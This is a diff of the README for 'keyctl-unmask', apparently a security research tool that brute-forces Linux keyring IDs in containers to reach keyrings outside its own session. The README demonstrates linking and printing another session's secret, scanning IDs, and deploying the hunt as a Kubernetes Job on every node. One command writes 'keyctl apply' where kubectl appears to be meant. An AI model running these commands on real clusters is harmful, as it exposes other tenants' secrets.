@@ -88,15 +88,6 @@ kubectl run --rm -i \
       -- keyctl-unmask -hunt  
 ```
 
-## Deployment as a Job
-
-Deploying as a Job will run this on each node in the cluster to let you figure out 
-if any cluster has interesting things within each Node. 
-
-```bash
-keyctl apply -f examples/k8s/keyctl-unmask-job.yaml
-```
-
 ### Kubernetes One Off Pod With Progress Bar
 
 The following one liner will start a hunt into the kubernetes cluster and 
@@ -174,7 +165,7 @@ Session Keyring
 To demonstrate the problem, I'm going to show you what happens even if you know the key ID of the secret:
 
 ~~~shell
-root@94e0b6836d5f:/# keyctl print 123456789
+root@keyctl-attacker:/# keyctl print 123456789
 keyctl_read_alloc: Permission denied
 ~~~
 
@@ -188,13 +179,13 @@ your session keyring, show the keys, and then print the key we really wanted
 access to . 
 
 ~~~shell
-root@94e0b6836d5f:/# keyctl link 899321446 @s
-root@94e0b6836d5f:/# keyctl show
+root@keyctl-attacker:/# keyctl link 899321446 @s
+root@keyctl-attacker:/# keyctl show
 Session Keyring
  966368664 --alswrv      0     0  keyring: _ses.94e0b6836d5f343f2a288731c26c96e4656591fbec68c556b5dab32390a04024
  899321446 --alswrv      0     0   \_ keyring: _ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852
  911117332 --alswrv      0     0       \_ user: antitrees_secret
-root@94e0b6836d5f:/# keyctl print 911117332
+root@keyctl-attacker:/# keyctl print 911117332
 thetruthisiliketrees
 ~~~
 
@@ -203,10 +194,10 @@ is a problem that `keyctl-unmask` fixes. We don't know the parent keyring ID...
 so lets guess it!
 
 ~~~shell
-root@94e0b6836d5f:/# keyctl-unmask -min 0 -max 999999999
+root@keyctl-attacker:/# keyctl-unmask -min 0 -max 999999999
 10 / 10 [----------------------------------------------------------------------------] 100.00% ? p/s 0s
 Output saved to:  ./keyctl_ids
-root@94e0b6836d5f:/# cat keyctl_ids 
+root@keyctl-attacker:/# cat keyctl_ids 
 ~~~
 
 ~~~json
@@ -238,8 +229,30 @@ root@94e0b6836d5f:/# cat keyctl_ids
  ]
 ~~~
 
+## Demo Kubernetes 
 
-## Demo Kubernetes
+Deploying as a Job will run this on each node in the cluster to let you figure out 
+if any cluster has interesting things within each Node. This creates a PVC to store
+the results of each Node's keychain. 
+
+```bash
+keyctl apply -f examples/k8s/keyctl-unmask-job.yaml
+```
+
+Attach to the debug Pod to read the results:
+
+```bash
+kubectl exec -it -n test keyctl-unmask-debug-pod -- /bin/bash
+> cat /keyctl-output/$NODE_NAME
+{
+ "KeyId": 899321446,
+ "Valid": true,
+ "Name": "_ses.95f119ce25274b852fc62369089dcb4fbe15678e62eecfdc685d292e6a01f852",
+ "Type": "keyring",
+...
+```
+
+
 
 ## History of Containers and KEYCTL Syscall
 
